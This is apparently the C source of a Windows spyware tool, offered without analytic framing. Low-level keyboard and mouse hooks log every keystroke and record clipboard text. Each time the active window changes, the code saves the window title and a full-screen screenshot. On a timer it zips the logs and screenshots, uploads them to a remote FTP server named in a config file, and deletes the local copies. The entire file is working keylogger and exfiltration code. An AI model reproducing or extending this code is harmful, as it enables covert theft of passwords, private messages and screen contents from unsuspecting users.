#include "functions.h"

DWORD start_time = GetTickCount();
int i_bmp = -1;

void get_this_dir_path(char *this_dir_path)
{
    char this_file_path[STR_SIZE];
    GetModuleFileNameA(NULL, this_file_path, STR_SIZE);

    char *last_char = strrchr(this_file_path, '\\');
    unsigned int len_path = (strlen(this_file_path) - strlen(last_char)) + 1;

    strncpy(this_dir_path, this_file_path, len_path);
    this_dir_path[len_path] = '\0';
}

SOCKET create_sock( char * serverHost, short serverPort )
{
	SOCKET Socket=INVALID_SOCKET;
	// Initialise Winsock
	WSADATA WsaDat;
	if (  WSAStartup( MAKEWORD(2,2), &WsaDat ) != 0 )
	{
		//printf( "WSA Initialization failed! Error code: %d\n", WSAGetLastError() );
		WSACleanup();
        return INVALID_SOCKET;
	}
	
	Socket = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
	if ( Socket == INVALID_SOCKET )
	{
		//printf( "Socket creation failed. Error code: %d\n", WSAGetLastError() );
		WSACleanup();
        return INVALID_SOCKET;
	}

	// Resolve IP address for hostname
	struct hostent *host;
	if ( ( host = gethostbyname( serverHost ) ) == NULL )
	{
		//printf( "Failed to resolve hostname. Error code: %d\n", WSAGetLastError() );
		WSACleanup();
        return INVALID_SOCKET;
	}

	// Setup our socket address structure
	SOCKADDR_IN SockAddr;
    SockAddr.sin_port = htons( (u_short)serverPort );
	SockAddr.sin_family = AF_INET;
	SockAddr.sin_addr.s_addr = *( (unsigned long*)host->h_addr );

	// Attempt to connect to server
	if ( connect(Socket, (SOCKADDR*)(&SockAddr), sizeof(SockAddr)) != 0 )
	{
		//printf( "Failed to establish connection with server. Error code: %d\n", WSAGetLastError() );
		WSACleanup();
        return INVALID_SOCKET;
	}

	return Socket;
}

void delete_socket(SOCKET s)
{
	shutdown(s, SD_SEND);	// Shutdown our socket
	closesocket(s);	// Close our socket entirely
	WSACleanup();	// Cleanup Winsock
}

unsigned long _random()
 {
	unsigned long x, y, rnd;
	srand(time(NULL));
	x = rand();
	y = rand();
	rnd = x+y;
	return rnd;
 }
 

bool  save_bitmap(char *szFilename, HBITMAP hBitmap)
{
	HDC     hdc = NULL;
	FILE*   fp = NULL;
	LPVOID  pBuf = NULL;
	BITMAPINFO bmpInfo;
	BITMAPFILEHEADER  bmpFileHeader;
	bool result = false;

	do
	{
		hdc = GetDC(NULL);
		ZeroMemory(&bmpInfo, sizeof(BITMAPINFO));
		bmpInfo.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
		GetDIBits(hdc, hBitmap, 0, 0, NULL, &bmpInfo, DIB_RGB_COLORS);

		if(bmpInfo.bmiHeader.biSizeImage <= 0)
		{
			bmpInfo.bmiHeader.biSizeImage =  bmpInfo.bmiHeader.biWidth 
											* abs(bmpInfo.bmiHeader.biHeight)
											* (bmpInfo.bmiHeader.biBitCount + 7) / 8;
		}

		if((pBuf = malloc(bmpInfo.bmiHeader.biSizeImage)) == NULL)
		{
			//MessageBox( NULL, "Unable to Allocate Bitmap Memory", "Error",MB_OK|MB_ICONERROR);
			//printf("Error - Unable to Allocate Bitmap Memory\n");
			break;
		}

		bmpInfo.bmiHeader.biCompression = BI_RGB;
		GetDIBits(	hdc,
					hBitmap,
					0,
					bmpInfo.bmiHeader.biHeight,
					pBuf, 
					&bmpInfo, 
					DIB_RGB_COLORS);

		if((fp = fopen(szFilename,"wb")) == NULL)
		{
			//MessageBox( NULL, "Unable to Create Bitmap File", "Error",MB_OK|MB_ICONERROR);
			//printf("Error - Unable to Create Bitmap File\n");
			break;
		}

		bmpFileHeader.bfReserved1 = 0;
		bmpFileHeader.bfReserved2 = 0;

		bmpFileHeader.bfSize = sizeof(BITMAPFILEHEADER)
								+sizeof(BITMAPINFOHEADER)
								+bmpInfo.bmiHeader.biSizeImage;
		bmpFileHeader.bfType = 'MB';

		bmpFileHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
		fwrite(&bmpFileHeader, sizeof(BITMAPFILEHEADER), 1, fp);
		fwrite(&bmpInfo.bmiHeader, sizeof(BITMAPINFOHEADER), 1, fp);
		fwrite(pBuf,bmpInfo.bmiHeader.biSizeImage, 1, fp);

		result = true;
	}
	while(false);

	if(hdc)    
		ReleaseDC(NULL,hdc);

	if(pBuf)    
		free(pBuf);

	if(fp)     
		fclose(fp);

	return result;
}

bool screen_shot(char *szFilename, int Top, int Left, int Width, int Height)
{
	HWND hDesktopWnd = GetDesktopWindow();
	HDC hDesktopDC = GetDC(hDesktopWnd);
	HDC hCaptureDC = CreateCompatibleDC(hDesktopDC);
	HBITMAP hCaptureBitmap = CreateCompatibleBitmap(hDesktopDC, Width, Height);

	SelectObject(hCaptureDC,hCaptureBitmap);
	BitBlt(hCaptureDC, 0, 0, Width, Height, hDesktopDC, Left, Top, SRCCOPY);

	bool result = save_bitmap(szFilename, hCaptureBitmap);

	ReleaseDC(hDesktopWnd, hDesktopDC);
	DeleteDC(hCaptureDC);
	DeleteObject(hCaptureBitmap);

	return result;
}

void get_registry_key( HKEY hKey, char *keyPath, char *keyName, char * reg_key )
{
	HKEY rKey;
	unsigned char keyData[STR_SIZE];
		
	DWORD Type= REG_SZ, 
				sizeData = sizeof( keyData );
	long res;
	
	res = RegOpenKeyEx( 	hKey, 
                            (LPCWSTR)keyPath,
							0, 
							KEY_QUERY_VALUE, 
							&rKey );
    //if ( res != ERROR_SUCCESS )
		//printf("Error Opening Registry Key\n");
	
	res = RegQueryValueEx(	rKey, 
                            (LPCWSTR)keyName,
                            NULL,
							&Type, 
							keyData, 
							&sizeData );
	if ( res != ERROR_SUCCESS ) 	
		//printf("Error Reading Value\n");
	
	strcpy(reg_key, (char *)keyData);
	RegCloseKey( rKey );	
}

bool set_registry_key( HKEY hKey, const char keyPath[],
                       const char keyName[], char *keyData )
{
	HKEY rKey;

	DWORD Type= REG_SZ, 
				sizeData = strlen( keyData ),
				disposition;
	long res;
	
	res = RegCreateKeyEx(	hKey, 
                            (LPCWSTR)keyPath,
                            0,
							NULL, 
							REG_OPTION_NON_VOLATILE, 
							KEY_ALL_ACCESS, 
							NULL, 
							&rKey, 
							&disposition );

	if ( disposition != REG_CREATED_NEW_KEY && disposition != REG_OPENED_EXISTING_KEY )
 	{
		return false;
		//printf("Error Create Key");
	}

	res = RegSetValueEx( 	rKey, 
                            (LPCWSTR)keyName,
                            0,
							Type, 
							(const unsigned char *)keyData, 
							sizeData );
	if ( res != ERROR_SUCCESS ) 
	{
		return false;
		//printf("Error Set Value");
	}

	RegCloseKey( rKey );
	return true;
}

int get_data_port(char *str)
{
	//"227 Entering Passive Mode (193,109,247,233,162,136)" -> p1=162, p2=136
	char *pch = strtok (str,"(");
	int j=0;
	int p1=0, p2=0;
	while (pch != NULL) 
	{
		pch = strtok (NULL, ",)");
		if (j==4)
		{		
			p1=atoi(pch);

			pch = strtok (NULL, ",)");
			p2=atoi(pch);

			break;
		}
		j++;
	}

	int port = (p1 * 256) + p2 ;

	return port;
}

void send_cmd(char *cmd, SOCKET socket)
{
	//printf( "client: %s", cmd );
	send( socket, cmd, strlen(cmd), 0);
}

char *recv_msg(SOCKET socket)
{
	char get_buffer[CMD_SIZE];
	memset(get_buffer, 0, sizeof(get_buffer));
	recv( socket, get_buffer, sizeof(get_buffer), 0 ) ;
	//printf( "server: %s", get_buffer );

	return get_buffer;
}

bool upload_file(	char *host,
					char *port,
					char *user_name,
					char *user_pass,
                    const char ftp_dir[],
					char *file_name,
					char *path_file )
{
	
	SOCKET socket_data = SOCKET_ERROR;
	SOCKET socket = SOCKET_ERROR;
	
	char cmd_user[CMD_SIZE];
	char cmd_pass[CMD_SIZE];
	char cmd_cwd[CMD_SIZE];
	char cmd_pwd[CMD_SIZE];
	char cmd_type[CMD_SIZE];
	char cmd_pasv[CMD_SIZE];
	char cmd_stor[CMD_SIZE];

	sprintf(cmd_user, "%s %s\r\n", USER, user_name);
	sprintf(cmd_pass, "%s %s\r\n", PASS, user_pass);
	sprintf(cmd_cwd, "%s %s\r\n", CWD, ftp_dir);
	sprintf(cmd_pwd, "%s\r\n", PWD);
	sprintf(cmd_type, "%s\r\n", TYPE_I);
	sprintf(cmd_pasv, "%s\r\n", PASV);	
	sprintf(cmd_stor, "%s %s\r\n", STOR, file_name);
	
	socket = create_sock( host, atoi(port) );
	if ( !socket )
	{
		//printf("Error creating socket!");
		return false;
	}

	FILE* file = fopen(path_file, "rb");

    if (!file)
	{
        //printf("File unavaible.\n");
		return false;
    }

	fseek(file, 0, SEEK_END);
    int size = ftell(file);
	fseek(file, 0, SEEK_SET);

	char *file_buffer;
	if (size <= FILE_BUFF_SIZE)
	{
		file_buffer = (char*)malloc(sizeof(char)*size);
	}
	else
	{
		file_buffer = (char*)malloc(sizeof(char)*FILE_BUFF_SIZE);
	}

	char get_buffer[CMD_SIZE];

	size_t len = 1;

	recv_msg(socket);
	send_cmd(cmd_user, socket);
	recv_msg(socket);
	send_cmd(cmd_pass, socket);
	recv_msg(socket);
	send_cmd(cmd_cwd, socket);
	recv_msg(socket);
	send_cmd(cmd_type, socket);
	recv_msg(socket);

	send_cmd(cmd_pasv, socket);
	char *tmp1 = recv_msg(socket);
	sprintf(get_buffer, "%s", tmp1);

	send_cmd(cmd_stor, socket);

	int port_data = get_data_port(get_buffer);
	socket_data = create_sock(host, port_data);
	char *tmp2 = recv_msg(socket);
	sprintf(get_buffer, "%s", tmp2);

	if (strstr(get_buffer, ACCEPT_DATA) != NULL)
	{						
		//printf("Send file size %d bytes\n", size);

		while( (len = fread(file_buffer, len, 1, file))  > 0)
		{
			if( 0 > send(socket_data, file_buffer, len, 0) )
			{
				perror("Error sending data!");
				break;
			}
		}
	}	
	
	fclose(file);
	delete_socket(socket_data);
	recv_msg(socket);	
	delete_socket(socket);

	return true;
}

void write_log(const char *data)
{
	FILE *f = fopen(LOG_FILE, "a+");
	if(f)
	{
		fputs(data, f);
		fclose(f);
	}
}

char old_data[STR_SIZE_MAX];
bool first = true;
void set_clipboard()
{
	if(OpenClipboard(NULL))
	{
		char *data = (char*)GetClipboardData(CF_TEXT);
		if (first)
		{
			sprintf(old_data, data);
			first = false;
		}

		if(data)
		{
			if (strcmp(data, old_data)) 
			{				
				sprintf(old_data, data);
				write_log(data);
				write_log("\n");
			}
		}
		CloseClipboard();
	}
}

HWND old_window = NULL;
char bmp_file[N_FILES][STR_SIZE];
void change_window()
{
	HWND newWindow = GetForegroundWindow();
	char cWindow[STR_SIZE];
	char info_title[STR_SIZE_MAX];
	if(old_window == NULL || newWindow != old_window)
	{
		// Get Active window title and store it
		GetWindowTextA(GetForegroundWindow(), cWindow, sizeof(cWindow));
		sprintf(info_title, "\nACTIVE WINDOW: %s\n", cWindow);
		write_log(info_title);
		old_window = newWindow;

		// Create screenshot
		++i_bmp;
		char tmp_str[STR_SIZE];
		sprintf(tmp_str, "file_%d.bmp", i_bmp);
		strcpy(bmp_file[i_bmp], tmp_str);		
		bool result = screen_shot(	bmp_file[i_bmp], 0, 0, 
									GetSystemMetrics(SM_CXSCREEN), 
									GetSystemMetrics(SM_CYSCREEN) );
		if (!result)
		{
			if (i_bmp >= 0)
				--i_bmp;
		}
	}
}

bool shift = false;
int CALLBACK keyoard_hook(int n_code, DWORD w_param, DWORD l_param)
{
	KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT*)l_param;

	if(n_code == HC_ACTION)
	{
		
		bool caps = GetKeyState(VK_CAPITAL) > 0; //CapsLock on|off
	
		if (GetAsyncKeyState(VK_CONTROL)) // Ctrl +
		{
			if((kbd->vkCode == 0x43) // C
				|| (kbd->vkCode == 0x58)) // X
			{
				set_clipboard();			
			}
		}

		if(kbd->vkCode == VK_LSHIFT || kbd->vkCode == VK_RSHIFT)
		{
			shift = (w_param == WM_KEYDOWN);
		}

		if(w_param == WM_SYSKEYDOWN || w_param == WM_KEYDOWN) 
		{
			write_char_code(kbd->vkCode, shift, caps);
		}

		change_window();
	}

	DWORD finish_time = GetTickCount();
	DWORD diff_time_sec = (finish_time - start_time) / 1000;

	if (diff_time_sec >= INTERVAL_TIME) 
	{
		send_file();
		old_window = NULL;
		start_time = GetTickCount();
	}

	return CallNextHookEx(NULL, n_code, w_param, l_param);
}

LRESULT CALLBACK mouse_hook(int n_code, DWORD w_param, DWORD l_param)
{
	if(w_param == WM_RBUTTONDOWN || w_param == WM_LBUTTONDOWN)
	{
        set_clipboard();
        change_window();
	}

	return CallNextHookEx(NULL, n_code, w_param, l_param);
}

bool send_file()
{
	char ho[STR_SIZE];
	char po[STR_SIZE];
	char lo[STR_SIZE];
    char pa[STR_SIZE];
    read_config( CONF_FILE, ho, po, lo, pa );
//TODO path
    char zip_path[STR_SIZE];
    get_this_dir_path(zip_path);
	char zip_file[STR_SIZE];
	char zip_file_path[CMD_SIZE];
	sprintf(zip_file, "%s%d%s", "data", _random(), ".zip");
	sprintf(zip_file_path, "%s%s", zip_path, zip_file);
	
	create_zip_file(zip_file_path, bmp_file, LOG_FILE);

	bool uploaded = upload_file( ho, po, lo, pa, "\/", zip_file, zip_file_path);
	if(uploaded)
		remove(zip_file_path);

	return uploaded;
}

void create_zip_file(char *path_zip_file, 
					 char screen_file[N_FILES][STR_SIZE], 
                     const char log_file[])
{
    struct zip_t *zip = zip_open(path_zip_file, ZIP_DEFAULT_COMPRESSION_LEVEL, 'w');
    {
        for(int i=0; i <= i_bmp; i++)
        {
            zip_entry_open(zip, screen_file[i]);
            zip_entry_fwrite(zip, screen_file[i]);
            zip_entry_close(zip);
        }

        zip_entry_open(zip, log_file);
        zip_entry_fwrite(zip, log_file);
        zip_entry_close(zip);

    }
    zip_close(zip);

	for(int i=0; i <= i_bmp; i++)
		remove( screen_file[i] );

	remove( log_file ); 

	i_bmp = 0;
}

bool copy_file(char *src_file_path, char *dst_file_path)
{
    FILE *src_file = fopen(src_file_path, "rb");
	if(!src_file)
	{
		return false;
	}

	fseek(src_file, 0, SEEK_END); //to end of file
	long size_src_file = ftell(src_file); // size of file
	rewind(src_file); //to begin of file

	FILE *dst_file = fopen(dst_file_path, "wb");
	if(!dst_file)
	{
		return false;
	}

	BYTE *buff = (BYTE*)malloc(sizeof(BYTE)*size_src_file);

	fread(buff, 1, size_src_file, src_file);
	fwrite(buff, 1, size_src_file, dst_file);

	fclose(src_file);
	fclose(dst_file);
	//MessageBoxA(NULL, dst_file_path, "new file:", NULL);
	return true;
}

bool read_config(	const char config[80],
					char *host,
					char *port,
					char *login,
					char *password )
{
	FILE *file = fopen(config, "r");
	if(!file)
	{
		puts("File not open!\n");
		return false;
	}
	
	char str[STR_SIZE];
#define LF 0x0a
	while( fgets(str, STR_SIZE, file) )
	{
		if( strstr(str, "host") != NULL )
		{	
			strtok(str, " :"); 
			sprintf(host, strtok(NULL, " :"));
            if(host[strlen(host)-1]==LF)
            {
                host[strlen(host)-1] = '\0';
            } else {
                host[strlen(host)] = '\0';
            }
		}
		else if( strstr(str, "port") != NULL )
		{	
			strtok(str, " :"); 
			sprintf(port, strtok(NULL, " :"));
            if(port[strlen(port)-1]==LF)
            {
                port[strlen(port)-1] = '\0';
            } else {
                port[strlen(port)] = '\0';
            }
		}
		else if( strstr(str, "login") != NULL )
		{	
			strtok(str, " :"); 
			sprintf(login, strtok(NULL, " :"));
            if(login[strlen(login)-1]==LF)
            {
                login[strlen(login)-1] = '\0';
            } else {
                login[strlen(login)] = '\0';
            }
		}
		else if( strstr(str, "password") != NULL )
		{	
			strtok(str, " :"); 
			sprintf(password, strtok(NULL, " :"));
            if(password[strlen(password)-1]==LF)
            {
                password[strlen(password)-1] = '\0';
            } else {
                password[strlen(password)] = '\0';
            }
		}
	}
	return true;
}

void write_char_code(DWORD vk_code, bool shift, bool caps)
{
	switch(vk_code) // Compare virtual keycode to hex values and log keys accordingly
	{
		//Number keys
		case 0x30: write_log(shift?")":"0");break;
		case 0x31: write_log(shift?"!":"1");break;
		case 0x32: write_log(shift?"@":"2");break;
		case 0x33: write_log(shift?"#":"3");break;
		case 0x34: write_log(shift?"$":"4");break;
		case 0x35: write_log(shift?"%":"5");break;
		case 0x36: write_log(shift?"^":"6");break;
		case 0x37: write_log(shift?"&":"7");break;
		case 0x38: write_log(shift?"*":"8");break;
		case 0x39: write_log(shift?"(":"9");break;
		// Numpad keys
		case 0x60: write_log("0");break;
		case 0x61: write_log("1");break;
		case 0x62: write_log("2");break;
		case 0x63: write_log("3");break;
		case 0x64: write_log("4");break;
		case 0x65: write_log("5");break;
		case 0x66: write_log("6");break;
		case 0x67: write_log("7");break;
		case 0x68: write_log("8");break;
		case 0x69: write_log("9");break;
		// Character keys
		case 0x41: write_log(caps?(shift?"a":"A"):(shift?"A":"a"));break;
		case 0x42: write_log(caps?(shift?"b":"B"):(shift?"B":"b"));break;
		case 0x43: write_log(caps?(shift?"c":"C"):(shift?"C":"c"));break;
		case 0x44: write_log(caps?(shift?"d":"D"):(shift?"D":"d"));break;
		case 0x45: write_log(caps?(shift?"e":"E"):(shift?"E":"e"));break;
		case 0x46: write_log(caps?(shift?"f":"F"):(shift?"F":"f"));break;
		case 0x47: write_log(caps?(shift?"g":"G"):(shift?"G":"g"));break;
		case 0x48: write_log(caps?(shift?"h":"H"):(shift?"H":"h"));break;
		case 0x49: write_log(caps?(shift?"i":"I"):(shift?"I":"i"));break;
		case 0x4A: write_log(caps?(shift?"j":"J"):(shift?"J":"j"));break;
		case 0x4B: write_log(caps?(shift?"k":"K"):(shift?"K":"k"));break;
		case 0x4C: write_log(caps?(shift?"l":"L"):(shift?"L":"l"));break;
		case 0x4D: write_log(caps?(shift?"m":"M"):(shift?"M":"m"));break;
		case 0x4E: write_log(caps?(shift?"n":"N"):(shift?"N":"n"));break;
		case 0x4F: write_log(caps?(shift?"o":"O"):(shift?"O":"o"));break;
		case 0x50: write_log(caps?(shift?"p":"P"):(shift?"P":"p"));break;
		case 0x51: write_log(caps?(shift?"q":"Q"):(shift?"Q":"q"));break;
		case 0x52: write_log(caps?(shift?"r":"R"):(shift?"R":"r"));break;
		case 0x53: write_log(caps?(shift?"s":"S"):(shift?"S":"s"));break;
		case 0x54: write_log(caps?(shift?"t":"T"):(shift?"T":"t"));break;
		case 0x55: write_log(caps?(shift?"u":"U"):(shift?"U":"u"));break;
		case 0x56: write_log(caps?(shift?"v":"V"):(shift?"V":"v"));break;
		case 0x57: write_log(caps?(shift?"w":"W"):(shift?"W":"w"));break;
		case 0x58: write_log(caps?(shift?"x":"X"):(shift?"X":"x"));break;
		case 0x59: write_log(caps?(shift?"y":"Y"):(shift?"Y":"y"));break;
		case 0x5A: write_log(caps?(shift?"z":"Z"):(shift?"Z":"z"));break;
		// Special keys
		case VK_SPACE: write_log(" "); break;
		case VK_RETURN: write_log("\n"); break;
		case VK_TAB: write_log("\t"); break;
		case VK_ESCAPE: write_log("[ESC]"); break;
		case VK_LEFT: write_log("[LEFT]"); break;
		case VK_RIGHT: write_log("[RIGHT]"); break;
		case VK_UP: write_log("[UP]"); break;
		case VK_DOWN: write_log("[DOWN]"); break;
		case VK_END: write_log("[END]"); break;
		case VK_HOME: write_log("[HOME]"); break;
		case VK_DELETE: write_log("[DELETE]"); break;
		case VK_BACK: write_log("[BACKSPACE]"); break;
		case VK_INSERT: write_log("[INSERT]"); break;
		case VK_LCONTROL: write_log("[CTRL]"); break;
		case VK_RCONTROL: write_log("[CTRL]"); break;
		case VK_LMENU: write_log("[ALT]"); break;
		case VK_RMENU: write_log("[ALT]"); break;
		case VK_F1: write_log("[F1]");break;
		case VK_F2: write_log("[F2]");break;
		case VK_F3: write_log("[F3]");break;
		case VK_F4: write_log("[F4]");break;
		case VK_F5: write_log("[F5]");break;
		case VK_F6: write_log("[F6]");break;
		case VK_F7: write_log("[F7]");break;
		case VK_F8: write_log("[F8]");break;
		case VK_F9: write_log("[F9]");break;
		case VK_F10: write_log("[F10]");break;
		case VK_F11: write_log("[F11]");break;
		case VK_F12: write_log("[F12]");break;
		// Shift keys
		case VK_LSHIFT: break; // Do nothing
		case VK_RSHIFT: break; // Do nothing
		// Symbol keys
		case VK_OEM_1: write_log(shift?":":";");break;
		case VK_OEM_2: write_log(shift?"?":"/");break;
		case VK_OEM_3: write_log(shift?"~":"`");break;
		case VK_OEM_4: write_log(shift?"{":"[");break;
		case VK_OEM_5: write_log(shift?"|":"\\");break;
		case VK_OEM_6: write_log(shift?"}":"]");break;
		case VK_OEM_7: write_log(shift?"\"":"'");break;
		case VK_OEM_PLUS: write_log(shift?"+":"=");break;
		case VK_OEM_COMMA: write_log(shift?"<":",");break;
		case VK_OEM_MINUS: write_log(shift?+"_":"-");break;
		case VK_OEM_PERIOD: write_log(shift?">":".");break;
	}
}
